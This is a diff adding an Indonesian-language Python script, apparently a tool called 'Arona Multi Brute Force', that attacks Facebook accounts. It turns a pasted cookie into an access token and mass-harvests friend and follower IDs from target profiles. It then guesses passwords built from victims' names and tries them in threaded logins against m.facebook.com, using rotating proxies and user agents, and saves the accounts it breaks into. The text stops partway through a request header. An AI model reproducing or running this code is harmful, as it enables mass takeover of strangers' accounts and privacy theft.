+J3 = "#FF8F00" # JINGGA
+A2 = "[#AAAAAA]" # ABU-ABU
+warna_warni_rich=random.choice([J3,K3,H3,P3,O3,N3,U3,B3,M3])
+warna_warni_rich_cerah=random.choice([J3,K3,H3,O3,N3,U3,B3])
+garis = f" {P}[{H}•{P}]"
+
+now = datetime.datetime.now()
+hour = now.hour
+if hour < 4:
+  hhl = "selamat dini hari"
+elif 4 <= hour < 12:
+  hhl = "selamat pagi"
+elif 12 <= hour < 15:
+  hhl = "selamat siang"
+elif 15 <= hour < 17:
+  hhl = "selamat sore"
+elif 17 <= hour < 18:
+  hhl = "selamat petang"
+else:
+  hhl = "selamat malam"
+
+def banner():
+	os.system("clear")
+	print(f"""
+\t   _____      _____   __________ ___________
+\t  /  _  \    /     \  \______   \\_   _____/
+\t /  /_\  \  /  \ /  \  |    |  _/ |    __)  
+\t/    |    \/    Y    \ |    |   \ |     \   
+\t\____|__  /\____|__  / |______  / \___  /   
+\t        \/         \/         \/      \/ • Arona Multi Brute Force •
+\t\t{garis} author by {K}HikmatXD
+""")
+
+def cek_cookie():
+	try:
+		token  = open('token.txt','r').read()
+		cookie = {'cookie':open('cookie.txt','r').read()}
+		try:
+			token  = open('token.txt','r').read()
+			cookie = {'cookie':open('cookie.txt','r').read()}
+			kook = open('cookie.txt','r').read()
+			get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
+			gut = json.loads(get.text)
+			xname = gut["name"]
+			x=f"{P2}{kook}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			x=f"{P2}{token}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			print("")
+			x=f"\t\t{P2}cookie {H2}{xname} {P2}belum invalid"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(f"{garis} enter untuk ke menu ")
+			menu()
+		except (KeyError):
+			x=f"\t\t{P2}cookie kadaluarsa"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			os.system('rm -rf cookie.txt')
+			os.system('rm -rf token.txt')
+			turu(0.05)
+			login()
+		except requests.exceptions.ConnectionError:
+			x=f"\t\t{P2}koneksi internet bermasalah"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			exit()
+	except IOError:
+		login()
+
+def login():
+	banner()
+	x=f"{P2}halo pengguna script arona multi brute force :)\n{P2}silahkan pilih fitur login cookie untuk melanjutkan ke menu arona multi brute force.. klo tidak mengerti apa² bisa ketik {M2}help {P2}untuk meminta bantuan !!"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	print("")
+	x=f"\t\t{P2}[01] login with cookie\n\t\t{P2}[02] report bug script\n\t\t{P2}[{M2}00{P2}] exit "
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	cukuf = input(f" {P}[{H}•{P}] pilih : {H}")
+	if cukuf in ["help","Help","HELP"]:
+		print("")
+		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo ada kepentingan yang mau disampaikan ke author ambf\nini klo gak bisa diarahin ke whastapp admin yakk"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		print("")
+		x=f"{P2}sedang diarahkan ke whastapp author"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		os.system('xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?')
+		input(f" {P}[{H}•{P}] kembali")
+		login()
+	elif cukuf in ["1","01"]:
+		login_cookie()
+	elif cukuf in ["2","02"]:
+		print("")
+		x=f"{P2}whatsapp admin *--> {H2}082115413282 {P2}harap chat klo memang ada yang error\nini klo gak bisa diarahin ke whastapp admin yakk"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		print("")
+		x=f"{P2}sedang diarahkan ke whastapp author"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		os.system('xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!')
+		input(f" {P}[{H}•{P}] kembali")
+		login()
+	elif cukuf in ["0","00"]:
+		exit()
+	else:
+		print("")
+		jalan(f"{garis} isi yang benar!! ")
+		login()
+
+def login_cookie():
+	print("")
+	#testi_ua()
+	x = f"{P2}jangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookie"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	cookie = str(input(f"{garis} masukkan cookie :"+H+" "))
+	with requests.Session() as xyz:
+		try:
+			jalan(f"{garis} sedang mengconvert cookie ke token... mohon tunggu ")
+			get_tok = xyz.get(url_businness+'/business_locations',headers = {"user-agent":ua_business,"referer": web_fb,"host": "business.facebook.com","origin": url_businness,"upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
+			token = re.search("(EAAG\w+)", get_tok.text).group(1)
+			open('cookie.txt','w').write(cookie) 
+			open('token.txt','w').write(token)
+			x=f"{P2}{token}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(f"{garis} enter untuk ke menu ")
+			menu()
+		except requests.exceptions.ConnectionError:
+			x=f"\t\t{P2}koneksi internet bermasalah"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		except (KeyError,IOError):
+			x=f"\t\t{P2}{cookie} invalid"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			os.system("rm -rf cookie.txt")
+			os.system("rm -rf token.txt")
+			login() 
+		
+now = datetime.datetime.now()
+hour = now.hour
+if hour < 4:
+  hhl = "selamat dini hari"
+elif 4 <= hour < 12:
+  hhl = "selamat pagi"
+elif 12 <= hour < 15:
+  hhl = "selamat siang"
+elif 15 <= hour < 17:
+  hhl = "selamat sore"
+elif 17 <= hour < 18:
+  hhl = "selamat petang"
+else:
+  hhl = "selamat malam"
+
+def menu():
+	banner()
+	try:EwePaksa = requests.get("http://ip-api.com/json/").json()
+	except:EwePaksa = {'-'}
+	try:IP = EwePaksa["query"]
+	except:IP = {'-'}
+	try:nibba = EwePaksa["country"]
+	except:nibba = {'-'}
+	try:rasis_Z_K_= EwePaksa["isp"]
+	except:rasis_Z_K_ = {'-'}
+	try:rasis_Z_K_X_= EwePaksa["city"]
+	except:rasis_Z_K_X_ = {'-'}
+	try:rasis_Z_K_X_R_= EwePaksa["timezone"]
+	except:rasis_Z_K_X_R_ = {'-'}
+	try:rasis_Z_K_X_R_H_= EwePaksa["countryCode"]
+	except:rasis_Z_K_X_R_H_ = {'-'}
+	try:rasis_Z_K_X_R_H_M_= EwePaksa["regionName"]
+	except:rasis_Z_K_X_R_H_M_ = {'-'}
+	try:rasis_Z_K_X_R_H_M_P_= EwePaksa["as"]
+	except:rasis_Z_K_X_R_H_M_P_ = {'-'}
+	token  = open('token.txt','r').read()
+	cookie = {'cookie':open('cookie.txt','r').read()}
+	get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
+	jsx = json.loads(get.text)
+	nama = jsx["name"]
+	tumbal_id = jsx["id"]
+	xn = requests.Session().get('https://graph.facebook.com/me?access_token=%s'%(token),cookies=cookie)
+	x = json.loads(xn.text)
+	lis = x["link"]
+	try:co = x["email"]
+	except (KeyError,IOError):
+		co = M+"-"+P
+	try:pko = x["birthday"]
+	except (KeyError,IOError):
+		pko = M+"-"+P
+	try:no_kep = x["mobile_phone"]
+	except (KeyError,IOError):
+		no_kep = M+"-"+P
+	try:lok = x["locale"]
+	except (KeyError,IOError):
+		lok = M+"-"+P
+	print("")
+	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}tanggal lahirmu : {H2}{pko}\n\t\t{P2}ID kamu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}negara kamu : {H2}{nibba}\n\t\t{P2}tanggal sekarang : {H2}{sekarang}"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	print("")
+	x=f"\t\t{P2}[01] crack with public\n\t\t{P2}[02] checkpoint detectored\n\t\t{P2}[{M2}00{P2}] exit/delete cookie"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	HikmatXD = input(f"{garis} pilih : {H}")
+	if HikmatXD in ["1","01"]:
+		cracked_publickey()
+	elif HikmatXD in ["2","02"]:
+		print("")
+		x=f"{P2}\t\tfitur ini dalam masa pengembangan!! "
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		input(f"{garis} enter untuk kembali ")
+		menu()
+		#check_detect()
+	elif HikmatXD in ["0","00"]:
+		print("")
+		x=f"\t\t{P2}[01] hapus cookie\n\t\t{P2}[02] exit\n\t\t{P2}[{H2}00{P2}] kembali"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		zk = input(f"{garis} pilih : {H}")
+		if zk in ["1","01"]:
+			print("")
+			c = input(f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}")
+			if c in ["ya","y","Y"]:
+				print("")
+				os.system("rm -rf cookie.txt")
+				os.system("rm -rf token.txt")
+				jalan(f"{garis} sukses menghapus cookie bawaan ")
+				cek_cookie()
+			elif c in ["t","T","tidak"]:
+				menu()
+			else:
+				print("")
+				jalan(f"{garis} isi yang benar ")
+				menu()
+		elif zk in ["2","02"]:
+			exit()
+		elif zk in ["0","00"]:
+			menu()
+		else:
+			print("")
+			jalan(f"{garis} isi yang benar ")
+			menu()
+	else:
+		print("")
+		jalan(f"{garis} isi yang benar ")
+		menu()
+
+def cracked_publickey():
+	cuy = input(f"{garis} apakah anda ingin crack massal ({H}y{P}/{M}t{P}) ? : {H}")
+	if cuy in ["y","Y"]:
+		massal_cracked_public()
+	elif cuy in ["t","T"]:
+		cracked_public()
+	else:
+		jalan(f"{garis} isi yang benar ")
+		cracked_publickey() 
+
+def massal_cracked_public():
+	print("")
+	x=f"\t\t{P2}target harus public & banyak friends nya"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	try:
+		jum = int(input(garis+" mau berapa id :"+H+" "))
+	except ValueError:
+		jalan(garis+" yang kamu ketik itu bukan nomor")
+		menu()
+	if jum<1 or jum>20:
+		jalan(garis+" kesalahan yang tidak terduga")
+		menu()
+	ses=requests.Session()
+	yz = 0
+	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	for met in range(jum):
+		yz+=1
+		kl = input(garis+" masukan id ke "+H+str(yz)+P+" :"+H+" ")
+		uid.append(kl)
+	for userr in uid:
+		try:
+			token = open('token.txt','r').read()
+			cookie = open('cookie.txt','r').read()
+			coki = {"cookie":cookie}
+			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(userr,token),cookies=coki)
+			el = json.loads(coa.text)
+			try:lk = el["name"]
+			except (KeyError,IOError):
+				lk = M+"-"+P
+			token = open('token.txt','r').read()
+			cookie = open('cookie.txt','r').read()
+			coki = {"cookie":cookie}
+			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(userr,token),cookies=coki).json()
+			for fuck in cyna['friends']['data']:
+				try:id.append(fuck['id']+'|'+fuck['name'])
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			jalan(garis+" koneksi internet bermasalah ")
+			exit()
+	if len(id)==0:
+		x=f"{P2}\t\ttotal id : {M2}{str(len(id))}\n\t\t{P2}nama id target : {M2}{lk}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	else:
+		x=f"{P2}\t\ttotal id : {H2}{str(len(id))}\n\t\t{P2}nama id target : {H2}{lk}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	settingers()
+
+def cracked_public():
+	print("")
+	x=f"\t\t{P2}target harus public & banyak friends nya"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	put = input(garis+" target id public :"+H+" ")
+	try:
+		token = open('token.txt','r').read()
+		cookie = open('cookie.txt','r').read()
+		coki = {"cookie":cookie}
+		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
+		el = json.loads(coa.text)
+		try:lk = el["name"]
+		except (KeyError,IOError):
+			lk = M+"-"+P
+		token = open('token.txt','r').read()
+		cookie = open('cookie.txt','r').read()
+		coki = {"cookie":cookie}
+		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
+		for fuck in cyna['friends']['data']:
+			try:id.append(fuck['id']+'|'+fuck['name'])
+			except:continue
+		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
+		for fak in cini['subscribers']['data']:
+			try:id3.append(fak['id']+'|'+fak['name'])
+			except:continue
+		#print(maling_pangsit+" nama target :%s %s"(H,lk))
+		x=f"{P2}\t\ttotal id : {H2}{str(len(id))}\n\t\t{P2}nama id target : {H2}{lk}\n{P2}\t\ttotal id followers : {H2}{str(len(id3))}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		settingers()
+	except requests.exceptions.ConnectionError:
+		jalan(garis+" koneksi internet bermasalah ")
+		exit()
+	except (KeyError,IOError):
+		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
+		exit()
+		#settingers()
+	
+def settingers():
+	print("")
+	x=f"\t\t{P2}[01] crack urutan new\n\t\t{P2}[02] crack urutan old\n\t\t{P2}[03] crack urutan random"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	GlukTzy = input(garis+" pilih : "+H)
+	if GlukTzy in ['2','02']:
+		for bacot in id:
+			id2.append(bacot)
+		for kont in id3:
+			id4.append(kont)
+	elif GlukTzy in ['1','01']:
+		for bacot in id:
+			id2.insert(0,bacot)
+		for kont in id3:
+			id4.insert(0,kont)
+	elif GlukTzy in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+		for kont in id3:
+			xx = random.randint(0,len(id4))
+			id4.insert(xx,bacot)
+	else:
+		jalan(garis+" isi yang benar")
+		settingers()
+	print("")
+	x=f"\t\t{P2}ketik {H2}d {P2}untuk lanjut crack public\n\t\t{P2}ketik {H2}m{P2} untuk lanjut crack followers\n\t\t{P2}kalo kamu pilih crack massal pilih saja {H2}d{P2}"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	pilihan = input(f"{garis} pilih {H}d{P}/{H}m{P} : {H}")
+	if pilihan in ["d","D"]:
+		crack_public_pilihan()
+	elif pilihan in ["m","M"]:
+		crack_followers_pilihan()
+	else:
+		jalan(f"{garis} isi yang benar ")
+		pilih_crack()
+
+def crack_public_pilihan():
+	print("")
+	x=f"\t\t{P2}[01] methode mobile ({H2}slowed cracked{P2})\n\t\t{P2}[02] methode mbasic ({K2}fast cracked{P2})\n\t\t{P2}[03] methode free  ({M2}not recommended {P2})\n\t\t{P2}[04] methode mobile version 2  ({H2}testions{P2})"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	met = input(garis+" pilih : "+H)
+	if met in ["1","01","a"]:
+		metode.append("mobile")
+	elif met in ["2","02","b"]:
+		metode.append("mbasic")
+	elif met in ["3","03","c"]:
+		metode.append("free")
+	elif met in ["4","04"]:
+		metode.append("mobile_v2")
+	else:
+		metode.append("mobile")
+	print("")
+	pw_tambahani = input(garis+" ingin menambahkan password tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
+		pw_tambahan.append("ya")
+		x=f"\t\t{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		pw_nya_cok = input(garis+" password tambahan :"+H+" ")
+		pw_gw=pw_nya_cok.split(',')
+		for cpw in pw_gw:
+			pw_ni.append(cpw)
+	elif pw_tambahani in ["t","T","Tidak","tidak","no"]:
+		pw_tambahan.append("no")
+	else:
+		pw_tambahan.append("no")
+	nanya_proxy = input(garis+" ingin menambahkan proxy tambahan ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if nanya_proxy in ["y","Y","yes","Ya"]:
+		proxp()
+	elif nanya_proxy in ["t","T","tidak","Tidak"]:
+		proxp()
+	else:
+		proxp()
+	tamtttl = input(garis+" ingin memunculkan ttl akun cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if tamtttl in ["y","Y","ya"]:
+		tampilkan_ttl.append("ya")
+	elif tamtttl in ["t","T","tidak"]:
+		tampilkan_ttl.append("no")
+	else:
+		tampilkan_ttl.append("no")
+	pw_tambahai = input(garis+" ingin menambahkan password belakang nama ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
+		pw_belakang.append("ya")
+		x=f"\t\t{P2}contoh password belakang : {H2}anjing,ngentot,sayang "
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		pw_nya_cok = input(garis+" password belakang nama :"+H+" ")
+		pw_gw=pw_nya_cok.split(',')
+		for cpw in pw_gw:
+			pw_lu.append(cpw)
+	elif pw_tambahai in ["t","T","Tidak","tidak","no"]:
+		pw_belakang.append("no")
+	else:
+		pw_belakang.append("no")
+	pilpas = input(garis+" ingin memakai password manual ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
+	if pilpas in ["y","Y","ya","yes"]:
+		with tread(max_workers=30) as HikmatXF:
+			x=f"\t\t{P2}contoh password : {H2}anjing,ngentot,sayang "
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			listpass = input(garis+"%s list password :%s "%(P,H))
+			if len(listpass)<=5:
+				exit("\n"+garis+"%s password minimal 6 angka"%(M))
+			x=f"\t\t{P2}list password crack {H2}{listpass}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			print("")
+			x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			print("")
+			for user in id:
+				HikmatXF.submit(mobile, user, listpass.split(","))
+		print("")
+		if len(ok) != 0 or len(cp) != 0:
+			x=f"\t\t{P2}hasil cp mu : {K2}{len(cp)}\n\t\t{P2}hasil ok mu : {H2}{len(ok)}"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+		else:
+			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
+			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			input(garis+" kembali ")
+			menu()
+	elif pilpas in ["t","T","tidak","Tidak"]:
+		passwer()
+
+def passwer():
+	print("")
+	x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	print("")
+	with tread(max_workers=30) as HikmatXD:
+		for koncol in id2:
+			uiz,mmk = koncol.split('|')[0],koncol.split('|')[1].lower()
+			prot = mmk.split(' ')[0]
+			pwr = []
+			if len(mmk)<6:
+				if len(prot)<3:
+					pass
+				else:
+					pwr.append(prot+'123')
+					pwr.append(prot+'12345')
+					pwr.append(prot+'1234')
+					pwr.append(prot+'123456')
+			else:
+				if len(prot)<3:
+					pwr.append(mmk)
+				else:
+					pwr.append(mmk)
+					pwr.append(prot+'123')
+					pwr.append(prot+'12345')
+					pwr.append(prot+'1234')
+					pwr.append(prot+'123456')
+			if 'ya' in pw_tambahan:
+				for xnxr in pw_ni:
+					pwr.append(xnxr)
+			if 'ya' in pw_belakang:
+				for asoe in pw_lu:
+					pwr.append(prot+asoe)
+			else:pass
+			if 'mobile' in metode:
+				HikmatXD.submit(mobile,uiz,pwr)
+			elif 'mbasic' in metode:
+				HikmatXD.submit(mbasic,uiz,pwr)
+			elif 'free' in metode:
+				HikmatXD.submit(free,uiz,pwr)
+			elif "mobile_v2" in metode:
+				HikmatXD.submit(mobile_v2,uiz,pwr)
+			else:
+				HikmatXD.submit(mobile,uiz,pwr)
+	print("")
+	if ok != 0 or cp != 0:
+		x=f"\t\t{P2}hasil cp mu : {K2}{cp}\n\t\t{P2}hasil ok mu : {H2}{ok}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		input(garis+" kembali ")
+		menu()
+	else:
+		x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		input(garis+" kembali ")
+		menu()
+		
+def mobile(uiz,pwr):
+	global ok,cp,loop
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	runc= random.choice([K,M,U,O,B,H])
+	#randomwar = random.choice(["["+randomly+"•\x1b[0m ]","["+randomly+"•  •\x1b[0m]", "["+randomly+"•  •  •\x1b[0m]", "["+randomly+"■■■■\x1b[0m□□□□□□]", "["+randomly+"■■■■■\x1b[0m□□□□□]", "["+randomly+"■■■■■■\x1b[0m□□□□]", "["+randomly+"■■■■■■■\x1b[0m□□□]", "["+randomly+"■■■■■■■■\x1b[0m□□]", "["+randomly+"■■■■■■■■■\x1b[0m□]", "["+randomly+"■■■■■■■■■■\x1b[0m]"])
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2),loop,H,ok,K,cp)); sys.stdout.flush()
+	for pw in pwr:
+		pw = pw.lower()
+		try:
+			proxff= open('proxy_mat.txt','r').read().splitlines()
+			cuukk=random.choice(proxff)
+			proxs= {'http': 'socks5://'+cuukk}
+			#proxs2= {'http': 'socks4://'+nip}
+			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+			koki+=' m_pixel_ratio=2.625; wd=412x756'
+			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522